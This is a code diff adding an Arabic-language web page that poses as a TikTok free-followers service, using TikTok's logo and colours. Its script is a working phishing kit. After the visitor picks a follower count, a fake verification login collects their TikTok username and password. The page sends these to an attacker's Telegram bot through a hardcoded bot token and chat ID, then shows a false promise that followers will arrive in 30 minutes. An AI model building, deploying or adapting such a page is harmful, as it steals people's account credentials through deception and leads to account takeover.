@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختر عدد المتابعين</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Cairo', sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000000;
+        }
+        .form-container {
+            background-color: rgba(28, 28, 28, 0.8);
+            border-radius: 15px;
+            padding: 30px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .title {
+            font-size: 36px;
+            color: #FF0050;
+            margin-bottom: 20px;
+        }
+        #showFollowersBtn {
+            padding: 12px 20px;
+            font-size: 18px;
+            color: white;
+            background-color: #69C9D0;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .followers-option {
+            display: none;
+            padding: 12px 20px;
+            margin: 10px 5px;
+            font-size: 16px;
+            color: white;
+            background-color: #69C9D0;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            width: 60px;
+            height: 60px;
+            line-height: 36px;
+            text-align: center;
+            opacity: 0;
+        }
+        .get-followers-btn {
+            display: none;
+            padding: 12px 20px;
+            font-size: 18px;
+            color: white;
+            background-color: #FF0050;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 20px;
+        }
+        .login-input {
+            width: 90%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: none;
+            font-size: 16px;
+            background-color: #333;
+            color: white;
+        }
+        .login-btn {
+            width: 90%;
+            padding: 12px;
+            font-size: 18px;
+            background-color: #69C9D0;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+        .modal-content {
+            background-color: rgba(28, 28, 28, 0.9);
+            margin: 10% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+        }
+        #successMessage {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+        .success-content {
+            background-color: rgba(28, 28, 28, 0.9);
+            margin: 10% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 400px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="form-container">
+        <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok Logo" class="logo">
+        <div class="title">متابعين تيك توك حقيقيين</div>
+
+        <button id="showFollowersBtn">اختيار المتابعين</button>
+
+        <div id="followersOptions">
+            <button class="followers-option" data-value="500">500</button>
+            <button class="followers-option" data-value="1000">1000</button>
+            <button class="followers-option" data-value="1500">1500</button>
+            <button class="followers-option" data-value="2000">2000</button>
+            <button class="followers-option" data-value="2500">2500</button>
+            <button class="followers-option" data-value="3000">3000</button>
+        </div>
+
+        <div id="result"></div>
+        <button id="getFollowersBtn" class="get-followers-btn">اذهب للحصول على المتابعين</button>
+    </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <h2>قم بتسجيل الدخول للتحقق</h2>
+            <input type="text" class="login-input" id="username" placeholder="اسم المستخدم" required>
+            <input type="password" class="login-input" id="password" placeholder="كلمة المرور" required>
+            <button class="login-btn" id="loginSubmit">تسجيل الدخول</button>
+        </div>
+    </div>
+
+    <div id="successMessage">
+        <div class="success-content">
+            <h2 style="color: #FF0050;">تم إرسال المعلومات بنجاح!</h2>
+            <p style="color: white;">سيتم التحقق من حسابك وإرسال المتابعين لك بعد 30 دقيقة.</p>
+            <button id="closeMessage" class="login-btn">إغلاق</button>
+        </div>
+    </div>
+
+    <script>
+        const telegramBotToken = '7391359985:AAF8wa-mv6ZoIQQ53UDMIRGKdafrc8gG2ik'; // ضع هنا التوكن الخاص بالبوت
+        const chatId = 'imad27'; // ضع هنا معرف المحادثة الخاص بك
+        const showFollowersBtn = document.getElementById('showFollowersBtn');
+        const followersOptions = document.querySelectorAll('.followers-option');
+        const resultDiv = document.getElementById('result');
+        const getFollowersBtn = document.getElementById('getFollowersBtn');
+        const loginModal = document.getElementById('loginModal');
+        const loginSubmit = document.getElementById('loginSubmit');
+        const successMessage = document.getElementById('successMessage');
+        const closeMessage = document.getElementById('closeMessage');
+        let selectedFollowers = null;
+
+        showFollowersBtn.addEventListener('click', () => {
+            followersOptions.forEach((option, index) => {
+                setTimeout(() => {
+                    option.style.display = 'inline-block';
+                    option.style.opacity = 1;
+                }, index * 100);
+            });
+        });
+
+        followersOptions.forEach(option => {
+            option.addEventListener('click', () => {
+                followersOptions.forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                selectedFollowers = option.getAttribute('data-value');
+                resultDiv.innerHTML = `تم اختيار ${selectedFollowers} متابع.`;
+                getFollowersBtn.style.display = 'block'; // إظهار زر "اذهب للحصول على المتابعين"
+            });
+        });
+
+        getFollowersBtn.addEventListener('click', () => {
+            loginModal.style.display = 'block'; // إظهار نافذة تسجيل الدخول
+        });
+
+        loginSubmit.addEventListener('click', () => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!username || !password || !selectedFollowers) {
+                alert('يرجى إدخال جميع المعلومات.');
+                return;
+            }
+
+            const message = `تيك توك - متابعين مختارون\nاسم المستخدم: ${username}\nكلمة المرور: ${password}\nعدد المتابعين: ${selectedFollowers}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        successMessage.style.display = 'block'; // إظهار رسالة النجاح
+                        loginModal.style.display = 'none'; // إخفاء نافذة تسجيل الدخول
+                    } else {
+                        alert('حدث خطأ أثناء إرسال البيانات.');
+                    }
+                })
+                .catch(error => {
+                    alert('حدث خطأ أثناء إرسال البيانات.');
+                    console.error('Error:', error);
+                });
+        });
+
+        closeMessage.addEventListener('click', () => {
+            successMessage.style.display = 'none'; // إغلاق رسالة النجاح
+        });
+
+        // إغلاق نافذة تسجيل الدخول عند النقر        // إغلاق نافذة تسجيل الدخول عند النقر خارجها
+        window.addEventListener('click', (event) => {
+            if (event.target === loginModal) {
+                loginModal.style.display = 'none';
+            }
+        });
+    </script>
+
+</body>
+</html>
+
